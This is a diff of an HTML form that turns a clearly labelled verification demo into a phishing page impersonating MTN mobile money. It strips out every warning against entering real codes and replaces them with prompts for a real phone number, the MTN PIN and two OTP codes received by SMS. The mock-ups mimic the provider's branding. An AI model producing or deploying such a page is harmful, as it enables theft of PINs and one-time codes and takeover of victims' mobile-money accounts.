@@ -200,25 +200,22 @@ button:disabled {
 <body>
 
 <header class="header">
-  <div class="logo">DEMO</div>
+  <div class="logo">MOMO</div>
 </header>
-
-<main class="card">
-  <div class="demo">DEMONSTRATION ONLY — NEVER ENTER REAL ACCOUNT CODES</div>
 
   <!-- PAGE 1: PHONE NUMBER -->
   <section id="page1">
     <h1>Welcome</h1>
-    <p>Enter a nine-digit test number to begin the verification demonstration.</p>
-    <label for="phone">Test phone number</label>
+    <p>Enter Number.</p>
+    <label for="phone">Phone number</label>
     <input id="phone" type="tel" inputmode="numeric" maxlength="9" placeholder="9 digits" autocomplete="off">
     <button id="nextPhone" disabled="true">Next</button>
   </section>
 
-  <!-- PAGE 2: DEMO PIN -->
+  <!-- PAGE 2: MTN PIN -->
   <section id="page2" class="hidden">
-    <h1>Demo PIN</h1>
-    <p>Enter any five test digits. Do not use your real mobile-money PIN.</p>
+    <h1>MTN PIN</h1>
+    <p>ENTER PIN.</p>
     <div class="boxes" id="pinBoxes"></div>
     <div id="pinWaiting" class="hidden">
       <div class="spinner"></div>
@@ -227,12 +224,12 @@ button:disabled {
     <div id="pinMessage" class="status"></div>
   </section>
 
-  <!-- PAGE 3: FIRST DEMO CODE -->
+  <!-- PAGE 3: FIRST OTP CODE -->
   <section id="page3" class="hidden">
-    <h1>Verification Demo</h1>
-    <p>Enter any test value to continue.</p>
-    <div class="notice">This is a simulated verification step. No SMS is sent.</div>
-    <label for="code1">Test value</label>
+    <h1>OTP VERIFICATION</h1>
+    <p>Copy and paste the verification OTP received on normal sms.</p>
+    <div class="notice">Check your sms box for otp message from MTN. It may take a view seconds to arrive.</div>
+    <label for="code1">ENTER OTP</label>
     <input id="code1" type="text" autocomplete="off" placeholder="Enter a test value">
     <button id="submitCode1" disabled="true">Continue</button>
     <div id="code1Waiting" class="hidden">
@@ -242,10 +239,10 @@ button:disabled {
     <div id="code1Message" class="status"></div>
   </section>
 
-  <!-- PAGE 4: SECOND DEMO CODE -->
+  <!-- PAGE 4: SECOND OTP CODE -->
   <section id="page4" class="hidden">
-    <h1>Final Demo Step</h1>
-    <p>Enter any four test digits. Do not use an actual SMS code.</p>
+    <h1>OTP VERIFICATION</h1>
+    <p>Enter the four digits Code your received in your MTN SMS.</p>
     <div class="boxes" id="code2Boxes"></div>
     <div id="code2Waiting" class="hidden">
       <div class="spinner"></div>
